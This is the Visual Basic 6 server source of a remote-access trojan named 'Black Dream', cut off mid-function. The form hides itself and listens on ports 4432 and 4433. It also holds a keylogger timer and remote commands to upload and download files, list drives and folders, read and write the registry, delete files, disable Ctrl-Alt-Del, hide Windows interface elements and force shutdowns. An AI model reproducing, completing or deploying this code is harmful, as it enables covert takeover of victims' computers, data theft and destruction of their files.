VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Server 
   BorderStyle     =   0  'None
   Caption         =   "Black Dream"
   ClientHeight    =   4215
   ClientLeft      =   5865
   ClientTop       =   1410
   ClientWidth     =   3810
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Server.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4215
   ScaleWidth      =   3810
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer TimerFileListen 
      Interval        =   1
      Left            =   240
      Top             =   2280
   End
   Begin MSWinsockLib.Winsock WinsockData 
      Left            =   720
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   4433
   End
   Begin VB.DirListBox ListDir 
      Height          =   315
      Left            =   1320
      TabIndex        =   2
      TabStop         =   0   'False
      Top             =   3000
      Visible         =   0   'False
      Width           =   2175
   End
   Begin VB.FileListBox FileList 
      Height          =   285
      Left            =   1320
      TabIndex        =   1
      TabStop         =   0   'False
      Top             =   2640
      Visible         =   0   'False
      Width           =   2175
   End
   Begin VB.DriveListBox DriveList 
      Height          =   315
      Left            =   1320
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   2280
      Visible         =   0   'False
      Width           =   2175
   End
   Begin VB.Timer KeyloggerTimer 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   240
      Top             =   3480
   End
   Begin VB.Timer Timer 
      Interval        =   1
      Left            =   240
      Top             =   2880
   End
   Begin MSWinsockLib.Winsock WinsockCtl 
      Left            =   720
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   4432
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   $"Server.frx":08CA
      Height          =   1755
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   3495
      WordWrap        =   -1  'True
   End
End
Attribute VB_Name = "Server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim TransferFileOpen As Boolean
Dim TransferFileName As String
Dim EndKeylogger As Boolean
Dim AppendToFile As Boolean
Dim LoadedSize As Boolean
Dim FileBinary As String
Dim FileNumber As Long
Dim TotalBytes As Long
Dim FoundBytes As Long
Dim GotBytes As Long

Private Sub WinsockData_Close()
    WinsockData.Close
End Sub

Private Sub WinsockData_Connect()
    If WinsockData.State <> 7 Then WinsockData.Close
End Sub

Private Sub WinsockData_ConnectionRequest(ByVal requestID As Long)
    WinsockData.Close
    WinsockData.Accept requestID
End Sub

Private Sub WinsockData_DataArrival(ByVal BytesTotal As Long)

    On Error GoTo FinaliseError
    
    WaitTime = 0
    Do Until WaitTime = 1
        WaitTime = WaitTime + 1: DoEvents
        Loop 'Pausing it helps the file be written before the next data blocks arrive
    
    If TransferFileOpen = False Then
        LoadedSize = False
        FoundBytes = 0
        GotBytes = 0
        FileBinary = ""
        FileNumber = FreeFile
        Open TransferFileName For Binary Access Write As #FileNumber
            TransferFileOpen = True
            AppendToFile = True
    Else
        DoEvents
    End If
    
    Dim Data As String
    WinsockData.GetData Data

    If LoadedSize = False Then
        TotalBytes = CLng(Right(Data, Len(Data) - 1))
        LoadedSize = True
    Else
        If AppendToFile = True Then
            GotBytes = GotBytes + Len(Data)
            If GotBytes >= TotalBytes Then
                AppendToFile = False
                Put #FileNumber, , Left(Data, Len(Data) - (GotBytes - TotalBytes))
                Close #FileNumber
                TransferFileOpen = False
            Else
                FoundBytes = FoundBytes + Len(Data)
                Put #FileNumber, , Data
            End If
        End If
    End If
    
    Exit Sub
    
FinaliseError:
    
    Close #FileNumber
    WinsockData.Close

End Sub

Private Sub WinsockData_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    WinsockData.Close
End Sub

Private Sub Send_File(FileName As String)
    
    Dim FileNumber As Integer
    Dim FileBinary As String
    Dim BlockSize As Integer
    
    FileNumber = FreeFile
    Open FileName For Binary As #FileNumber
        
        BlockSize = 2048
        FileBinary = Space(BlockSize)
        WinsockData.SendData ";" & LOF(FileNumber)

        '{
        WaitTime = 0                'This creates a pause so the size is sent in time to Client
        Do Until WaitTime = 1000    'so the file binary doesn't add onto the end of the size
            DoEvents:               'and become a type mismatch
            WaitTime = WaitTime + 1: Loop
        '}
        
        Do
            Get #FileNumber, , FileBinary
            WinsockData.SendData FileBinary
            DoEvents: Loop Until EOF(FileNumber)
            
    Close #FileNumber

End Sub

Private Sub LoadCDRomdata()
    On Error Resume Next
    SendMCIString "close all", False
    If (SendMCIString("open cdaudio alias cd wait shareable", True) = False) Then
        'Do nothing
    End If
    SendMCIString "set cd time format tmsf wait", True
End Sub

Private Sub Form_Load()
    Me.Hide
    If App.PrevInstance = True Then End
    LoadCDRomdata
    EndKeylogger = True
End Sub

Private Sub Timer_Timer()
    On Error Resume Next
    WinsockCtl.Listen
End Sub

Private Sub TimerFileListen_Timer()
    On Error Resume Next
    WinsockData.Listen
End Sub

Private Sub WinsockCtl_Close()
    If WinsockCtl.State <> 7 Then WinsockCtl.Close
End Sub

Private Sub WinsockCtl_ConnectionRequest(ByVal requestID As Long)
    If WinsockCtl.State <> sckClosed Then WinsockCtl.Close
    WinsockCtl.Accept requestID
End Sub

Private Sub WinsockCtl_DataArrival(ByVal BytesTotal As Long)
    
    On Error GoTo FinaliseError
    
    Dim FileBinary As String
    Dim FileNumber As Long
    
    Dim RegVal0(0 To 13) As String
    
    Dim SendString As String
    Dim SendData As String
    
    Dim CountVal As Long
    Dim LastLen  As Long
    Dim val01 As String
    Dim val02 As String
    Dim val03 As String
    
    WinsockCtl.GetData SendData
    
    FileList.Refresh
    DriveList.Refresh
    ListDir.Refresh
    
    If Left(SendData, 17) = "[LOAD DRIVE DATA]" Then
        SendString = "[DRIVE LIST]" & DriveList.ListCount
        For M = 0 To DriveList.ListCount - 1
            SendString = SendString & Chr(0) & DriveList.List(M)
        Next M
        WinsockCtl.SendData SendString
    End If
    
    If Left(SendData, 18) = "[LOAD FOLDER DEFA]" Then
        FolderPath = Mid(SendData, 19, Len(SendData) - 18)
        ListDir.Path = "C:"
        SendString = ""
        For M = 0 To ListDir.ListCount - 1
            SendString = SendString & Chr(0) & ListDir.List(M)
        Next M
        SendString = SendString & Chr(0)
        If Len(SendString) < 4000 Then
            SendString = CStr("[FOLD LIST]" & SendString)
            WinsockCtl.SendData SendString
        Else
            For M = 0 To 10
                If M = 0 Then
                    WinsockCtl.SendData "A" & M & Mid(SendString, 1, Len(SendString) / 10)
                Else
                    WinsockCtl.SendData "A" & M & Mid(SendString, (Len(SendString) / 10) * M, Len(SendString) / 10)
                End If
                WaitTime = 0
                Do Until WaitTime = 0.000001
                    WaitTime = WaitTime + 0.000001
                    DoEvents
                Loop
            Next M
            WinsockCtl.SendData "[FOLD ADD]"
        End If
    End If
    
    If Left(SendData, 18) = "[LOAD FOLDER NAME]" Then
        FolderPath = Mid(SendData, 19, Len(SendData) - 18)
        ListDir.Path = FolderPath
        SendString = ""
        For M = 0 To ListDir.ListCount - 1
            SendString = SendString & Chr(0) & ListDir.List(M)
        Next M
        SendString = SendString & Chr(0)
        If Len(SendString) < 4000 Then
            SendString = CStr("[FOLD LIST]" & SendString)
            WinsockCtl.SendData SendString
        Else
            For M = 0 To 10
                If M = 0 Then
                    WinsockCtl.SendData "A" & M & Mid(SendString, 1, Len(SendString) / 10)
                Else
                    WinsockCtl.SendData "A" & M & Mid(SendString, (Len(SendString) / 10) * M, Len(SendString) / 10)
                End If
                WaitTime = 0
                Do Until WaitTime = 0.000001
                    WaitTime = WaitTime + 0.000001
                    DoEvents
                Loop
            Next M
            WinsockCtl.SendData "[FOLD ADD]"
        End If
    End If
    
    If Left(SendData, 18) = "[LOAD FOLDER DATA]" Then
        FolderPath = Mid(SendData, 19, Len(SendData) - 18)
        FileList.Path = FolderPath
        SendString = ""
        For M = 0 To FileList.ListCount - 1
            SendString = SendString & Chr(0) & FileList.List(M)
        Next M
        SendString = SendString & Chr(0)
        If Len(SendString) < 4000 Then
            SendString = CStr("[FILE LIST]" & SendString)
            WinsockCtl.SendData SendString
        Else
            For M = 0 To 10
                If M = 0 Then
                    WinsockCtl.SendData "A" & M & Mid(SendString, 1, Len(SendString) / 10)
                Else
                    WinsockCtl.SendData "A" & M & Mid(SendString, (Len(SendString) / 10) * M, Len(SendString) / 10)
                End If
                WaitTime = 0
                Do Until WaitTime = 0.000001
                    WaitTime = WaitTime + 0.000001
                    DoEvents
                Loop
            Next M
            WinsockCtl.SendData "[FILE ADD]"
        End If
    End If
        
    If Left(SendData, 16) = "[FILE SIZE DATA]" Then
        FolderPath = Mid(SendData, 17, Len(SendData) - 16)
        FileList.Path = FolderPath
        SendString = ""
        For M = 0 To FileList.ListCount - 1
            If Right(FileList.Path, 1) = "\" Or Right(FileList.Path, 1) = "/" Then
                SendString = SendString & Chr(0) & FileLen(FileList.Path & FileList.List(M))
            Else
                SendString = SendString & Chr(0) & FileLen(FileList.Path & "\" & FileList.List(M))
            End If
        Next M
        SendString = SendString & Chr(0)
        If Len(SendString) < 4000 Then
            SendString = CStr("[FSAA]" & SendString)
            WinsockCtl.SendData SendString
        End If
    End If
    
    Select Case Left(SendData, 3)
    
        'ALL BELOW ARE FEATURES FOR THE ClientS USE (ADDON_S)
        
        Case "1-1":
            'FILE TRANSFER DATA
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    TransferFileName = Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)))
                    TotalBytes = CLng(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "1-0":
            'SEND FILE TO CONNECTED Client (USING THE DATA WINSOCK CONTROL)
            TransferFileName = Mid(SendData, 4, Len(SendData) - 3)
            Send_File TransferFileName
        Case "0-9":
            'UNPRESSED INSERT
            WinsockCtl.SendData "M2Your data information request has been sent."
            SetInsertKey False
        Case "0-8":
            'SET CAPS LOCK OFF
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetCapsLock False
        Case "0-7":
            'SET NUM LOCK OFF
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetNumLock False
        Case "0-6":
            'SET SCROLL LOCK OFF
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetScrollLock False
        
        Case "0-5":
            'PRESSED ALT KEY
            WinsockCtl.SendData "M2Your data information request has been sent."
            AltKey
        Case "0-4":
            'PRESSED SHIFT
            WinsockCtl.SendData "M2Your data information request has been sent."
            ShiftKey
        Case "0-3":
            'PRESSED CTRL
            WinsockCtl.SendData "M2Your data information request has been sent."
            CtrlKey
        Case "0-2":
            'PRESSED INSERT
            WinsockCtl.SendData "M2Your data information request has been sent."
            SetInsertKey True
        Case "0-1":
            'LOAD INFO
            WinsockCtl.SendData "[INFO]" & GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "RegisteredOwner") & Chr(0) & GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "Version") & Chr(0) & CStr(App.Major & "." & App.Minor & "." & App.Revision)
        
        'ALL NEXT FUNCTIONS ARE BASED ON OPTIONS IN THE MAIN CLINT.
            
        Case "000":
            'END THE SERVER
            WinsockCtl.SendData "M2Your data information request has been sent."
            End
        Case "001":
            'SET MESSAGE POPUP
            WinsockCtl.SendData "M2Your data information request has been sent."
            Select Case Mid(SendData, 4, 1)
                Case 0: MsgBox Mid(SendData, 5, Len(SendData) - 4), vbOKOnly, "Message"
                Case 1: MsgBox Mid(SendData, 5, Len(SendData) - 4), vbQuestion, "Message"
                Case 2: MsgBox Mid(SendData, 5, Len(SendData) - 4), vbInformation, "Message"
                Case 3: MsgBox Mid(SendData, 5, Len(SendData) - 4), vbExclamation, "Message"
                Case 4: MsgBox Mid(SendData, 5, Len(SendData) - 4), vbCritical, "Message"
            End Select
        Case "002":
            'GET KEYBOARD TYPE
            WinsockCtl.SendData "001" & KeyboardInfo
        Case "003":
            'GET CARET BLINK RATE
            WinsockCtl.SendData "002" & GetCaretBlink
        Case "004":
            'SET CARET BLINK RATE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetCaretBlink CLng(Mid(SendData, 4, Len(SendData) - 3))
        Case "005":
            'GET DOUBLE CLICK RATE
            WinsockCtl.SendData "003" & GetDoubleClick
        Case "006":
            'OPEN SYSTEM INFO DIALOG
            WinsockCtl.SendData "M2Your data information request has been sent."
            GetSysInfo
        Case "007":
            'OPEN FILE PROPERTIES
            WinsockCtl.SendData "M2Your data information request has been sent."
            ShowProperties Mid(SendData, 4, Len(SendData) - 3), 0
        Case "008":
            'CLEAR DOCUMENTS
            ClearDocuments
            WinsockCtl.SendData "M2Your data information request has been sent."
        Case "009":
            'ADD TO DOCUMENTS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            AddToDocuments Mid(SendData, 4, Len(SendData) - 3)
        Case "010":
            'MAKE A PHONE CALL
            If InternetAutodialHangup(0) Then
                For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                    If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                        PhoneCall Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)
                        Exit For
                    End If
                Next M
                WinsockCtl.SendData "M2Your data call request has started."
            Else
                WinsockCtl.SendData "M4Your data (SET) information request has been aborted."
            End If
        Case "011":
            'SET CAPS LOCK ON
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetCapsLock True
        Case "012":
            'SET NUM LOCK ON
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetNumLock True
        Case "013":
            'SET SCROLL LOCK ON
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetScrollLock True
        Case "014":
            'ENABLE / DISABLE MOUSE CURSOR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            If Mid(SendData, 4, Len(SendData) - 3) = "0" Then
                Cursor True
            Else
                Cursor False
            End If
        Case "015":
            'CHECK FOR A SOUND CARD
            WinsockCtl.SendData "004" & IsThereASoundCard
        Case "016":
            'GET CYT 1.0 FILENAME NUMBER
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "005" & SOUNDPRECACHEGetNameNumber(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "017":
            'PASSWORD CALULATOR
            WinsockCtl.SendData "006" & PasswordCalculateMaker(Mid(SendData, 4, Len(SendData) - 3))
        Case "018":
            'HIDE TASKBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideTaskBar
        Case "019":
            'SHOW TASKBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowTaskBar
        Case "020":
            'HIDE DESKTOP
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideDesktop
        Case "021":
            'SHOW DESKTOP
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowDesktop
        Case "022":
            'PLAY SOUND
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            sndPlaySound Mid(SendData, 4, Len(SendData) - 3), 1
        Case "023":
            'START DOCUMENT
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            StartDoc Mid(SendData, 4, Len(SendData) - 3)
        Case "024":
            'SET DWORD VALUE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendData = Mid(SendData, 4, Len(SendData) - 3)
            For M = 1 To Len(SendData)
                ChrState = Mid(SendData, M, 1)
                If ChrState = Chr(0) Or M = 1 Then
                    Select Case CountVal
                        Case 0: LastLen = M: CountVal = 1
                        Case 1: val01 = Left(SendData, M - LastLen): LastLen = M: CountVal = 2
                        Case 2:
                        val03 = Right(SendData, Len(SendData) - M): CountVal = 3
                        val02 = Mid(SendData, LastLen + 1, Len(SendData) - (LastLen + Len(val03) + 1))
                    End Select
                End If
            Next M
            SetDWORDValue val01, val02, CLng(val03)
        Case "025":
            'GET DWORD VALUE
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "007" & GetDWORDValue(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "026":
            'SET BINARY VALUE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendData = Mid(SendData, 4, Len(SendData) - 3)
            For M = 1 To Len(SendData)
                ChrState = Mid(SendData, M, 1)
                If ChrState = Chr(0) Or M = 1 Then
                    Select Case CountVal
                        Case 0: LastLen = M: CountVal = 1
                        Case 1: val01 = Left(SendData, M - LastLen): LastLen = M: CountVal = 2
                        Case 2:
                        val03 = Right(SendData, Len(SendData) - M): CountVal = 3
                        val02 = Mid(SendData, LastLen + 1, Len(SendData) - (LastLen + Len(val03) + 1))
                    End Select
                End If
            Next M
            SetBinaryValue val01, val02, val03
        Case "027":
            'GET BINARY VALUE
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "008" & GetBinaryValue(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "028":
            'DELETE REGISTRY KEY
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            DeleteKey Mid(SendData, 4, Len(SendData) - 3)
        Case "029":
            'GET STRING VALUE
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "009" & GetStringValue(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "030":
            'CREATE REGISTRY KEY
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            CreateKey Mid(SendData, 4, Len(SendData) - 3)
        Case "031":
            'SET STRING VALUE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendData = Mid(SendData, 4, Len(SendData) - 3)
            For M = 1 To Len(SendData)
                ChrState = Mid(SendData, M, 1)
                If ChrState = Chr(0) Or M = 1 Then
                    Select Case CountVal
                        Case 0: LastLen = M: CountVal = 1
                        Case 1: val01 = Left(SendData, M - LastLen): LastLen = M: CountVal = 2
                        Case 2:
                        val03 = Right(SendData, Len(SendData) - M): CountVal = 3
                        val02 = Mid(SendData, LastLen + 1, Len(SendData) - (LastLen + Len(val03) + 1))
                    End Select
                End If
            Next M
            MsgBox val01
            MsgBox val02
            MsgBox val03
            SetStringValue val01, val02, val03
        Case "032":
    'NOT WORKING
            'GET DRIVE BYTES FREE
            WinsockCtl.SendData "010" & DriveBytesFree(CLng(Mid(SendData, 4, Len(SendData) - 3)))
        Case "033":
    'NOT WORKING
            'GET DRIVE TOTAL BYTES
            WinsockCtl.SendData "011" & DriveTotalBytes(CLng(Mid(SendData, 4, Len(SendData) - 3)))
        Case "034":
    'NOT WORKING
            'GET DRIVE PERCENT FREE
            WinsockCtl.SendData "012" & DrivePercentFree(CLng(Mid(SendData, 4, Len(SendData) - 3)))
        Case "035":
    'NOT WORKING
            'DRIVE OTHER INFORMATION
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "013" & DriveOtherInfo(CLng(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "036":
            'PRINT TEXT
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            PrintText Mid(SendData, 4, Len(SendData) - 3)
        Case "037":
            'SET CURSOR POSITION
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    SetCursorP CLng(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)))), CLng(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "038":
            'GET CURSOR POSITION X
            WinsockCtl.SendData "014" & GetCursorX
        Case "039":
            'GET CURSOR POSITION Y
            WinsockCtl.SendData "015" & GetCursorY
        Case "040":
            'OPEN CD ROM
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            OpenCDROM
        Case "041":
            'CLOSE CD ROM
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            CloseCDROM
        Case "042":
            'GET PRIVATE PROFILE STRING
            'NOT USED
        Case "043":
            'SET PRIVATE PROFILE STRING
            'NOT USED
        Case "044":
            'CALL CACHE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendData = Mid(SendData, 4, Len(SendData) - 3)
            For M = 1 To Len(SendData)
                ChrState = Mid(SendData, M, 1)
                If ChrState = Chr(0) Or M = 1 Then
                    Select Case CountVal
                        Case 0: LastLen = M: CountVal = 1
                        Case 1: val01 = Left(SendData, M - LastLen): LastLen = M: CountVal = 2
                        Case 2:
                        val03 = Right(SendData, Len(SendData) - M): CountVal = 3
                        val02 = Mid(SendData, LastLen + 1, Len(SendData) - (LastLen + Len(val03) + 1))
                    End Select
                End If
            Next M
            CallCache CLng(val01), val02, val03
        Case "045":
            'CHECK PAK VALID CYT1.0
            WinsockCtl.SendData "016" & PakValid(Mid(SendData, 4, Len(SendData) - 3))
        Case "046":
            'PRECACHE SOUND
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            'NOT USED IN VAL STATEMENT
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    PrecacheSound Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)
                    Exit For
                End If
            Next M
        Case "047":
            'CHECK FILE COUNT IN CYT1.0 SPK
            WinsockCtl.SendData "017" & SOUNDPRECACHEFileCount(Mid(SendData, 4, Len(SendData) - 3))
        Case "048":
            'GET NAME OUT OF SPK CYT1.0 PAK FILE (FROM NUMBER TO NAME)
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    WinsockCtl.SendData "018" & SOUNDPRECACHEGetName(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), CLng(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)))
                    Exit For
                End If
            Next M
        Case "049":
            'HIDE START BUTTON
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideStartButton
        Case "050":
            'SHOW START BUTTON
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowStartButton
        Case "051":
            'HIDE TASKBAR CLOCK
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideTaskBarClock
        Case "052":
            'SHOW TASKBAR CLOCK
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowTaskBarClock
        Case "053":
            'HIDE TASKBAR ICONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideTaskBarIcons
        Case "054":
            'SHOW TASKBAR ICONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowTaskBarIcons
        Case "055":
            'HIDE PROGRAMS SHOWING IN TASKBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideProgramsShowingInTaskBar
        Case "056":
            'SHOW PROGRAMS SHOWING IN TASKBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowProgramsShowingInTaskBar
        Case "057":
            'HIDE WINDOWS TOOLBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            HideWindowsToolBar
        Case "058":
            'SHOW WINDOWS TOOLBAR
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowWindowsToolBar
        Case "059":
            'DIABLE CTRL, ALT, DEL
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            DisableCtrlAltDel
        Case "060":
            'ENABLE CTRL, ALT, DEL
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            EnableCtrlAltDel
        Case "061":
            'WINDOWS LOGOFF
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            WINLogUserOff
        Case "062":
            'WINDOWS FORCE SHUTDOWN
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            WINForceClose
        Case "063":
            'WINDOWS SHUTDOWN
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            WINShutdown
        Case "064":
            'WINDOWS REBOOT
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            WINReboot
        Case "065":
            'OPEN FIND DIALOG
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ShowFindDialog Mid(SendData, 4, Len(SendData) - 3)
        Case "066":
            'HIDE DESKTOP ICONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            BestWayHideDesktopIcons
        Case "067":
            'SHOW DESKTOP ICONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            BestWayShowDesktopIcons
        Case "068":
            'DISPLAY EXE ICON CHANGE DIALOG
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            DisplayChangeIconDialog Mid(SendData, 4, Len(SendData) - 3)
        Case "069":
            'DRAW EXTRACTED ICON
            'NOT USED
        Case "070":
            'DISPLAY FORMAT DRIVE DIALOG (SPECIFY DRIVE LETTER)
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            DisplayFormatDriveDialog Mid(SendData, 4, Len(SendData) - 3)
        Case "071":
            'CHECK IF PATH IS EXECUTABLE
            WinsockCtl.SendData "019" & IsPathExecutable(Mid(SendData, 4, Len(SendData) - 3))
        Case "072":
            'EXIT WINDOWS MESSAGE DIALOG
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            ExitWindowsMsgBox
        Case "073":
            'DISPLAY RUN DIALOG
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    DisplayRunDialog 0, Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M), True, True
                    Exit For
                End If
            Next M
        Case "074":
            'CHECK HWND FOR WINDOWS IE PROTOCALL
            'NO RETURN REQUEST (NOT USED)
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    EnumWindowsProc CLng(Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)))), CLng(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))
                    Exit For
                End If
            Next M
        Case "075":
            'MINIMIZE ALL INTERNET EXPLORER WINDOWS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            MinimizeIE
        Case "076":
            'RESTORE ALL INTERNET EXPLORER WINDOWS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            RestoreIE
        Case "077":
            'GET WINDOW NAME
            Dim Win_Text As String
            Win_Text = Space(256)
            Call GetWindowText(CLng(Mid(SendData, 4, Len(SendData) - 3)), Win_Text, 256)
            WinsockCtl.SendData "020" & GetClassName(CLng(Mid(SendData, 4, Len(SendData) - 3))) & Chr(0) & Win_Text
        Case "078":
            'KILL FILE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Kill Mid(SendData, 4, Len(SendData) - 3)
        Case "079":
            'REMOVE DIRECTORY
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
